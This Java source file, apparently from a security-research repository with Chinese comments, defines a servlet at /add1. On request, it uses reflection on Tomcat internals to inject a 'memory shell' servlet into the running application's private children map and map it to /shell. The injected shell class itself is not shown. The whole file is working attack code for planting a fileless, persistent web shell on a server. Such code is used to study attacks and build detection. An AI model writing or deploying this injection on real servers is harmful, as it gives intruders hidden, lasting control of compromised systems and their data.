package cn.safe6.servlet;

import org.apache.catalina.Container;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardWrapper;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.HashMap;

/**
 * Servlet内存马添加，不用standardContext#addChild方法。全部用反射实现
 */
@WebServlet("/add1")
public class AddShellServlet1 extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

        try {
            //先拿到ServletContext
            ServletContext servletContext = req.getServletContext();
            Field appctx =servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);

            //从ServletContext里面拿到ApplicationContext
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
            Field atx= applicationContext.getClass().getDeclaredField("context");
            atx.setAccessible(true);
            //从ApplicationContext里面拿到StandardContext
            StandardContext standardContext = (StandardContext) atx.get(applicationContext);

            //准备内存马
            //ServletShell shell = new ServletShell();
            ServletShell1 shell = new ServletShell1();

            //用wrapper包装内存马
            Wrapper wrapper = new StandardWrapper();
            wrapper.setServlet(shell);
            wrapper.setName("shell");
            //设置加载顺序
            //wrapper.setLoadOnStartup(1);
            //设置servlet全限定名，可以不设置
            wrapper.setServletClass(shell.getClass().getName());

            //添加到标准上下文,不用addChild方法，用反射实现
            //standardContext.addChild(wrapper);
            Class staCtx = standardContext.getClass();

            //获取父类定义的字段，虽然有继承，但是没卵用。如过
            Class staCtxSp = staCtx.getSuperclass();

            Field childrenField = staCtxSp.getDeclaredField("children");
            childrenField.setAccessible(true);
            HashMap<String, Container> children = (HashMap<String, Container>)childrenField.get(standardContext);
            children.put("shell",wrapper);
            //改modifiers
            Field modifiers = childrenField.getClass().getDeclaredField("modifiers");
            modifiers.setAccessible(true);
            modifiers.setInt(childrenField,childrenField.getModifiers() & ~Modifier.FINAL);

            //还原children,可以不做，用的是一个引用
            childrenField.set(standardContext,children);


            //添加映射关系,不用addServletMappingDecoded方法，用反射实现
            //TODO 有bug，后面研究
            standardContext.addServletMappingDecoded("/shell","shell");
            resp.getWriter().write("add success!");
            return;

        } catch (Exception e) {
            e.printStackTrace();
        }
        resp.getWriter().write("add failed!");

    }
}
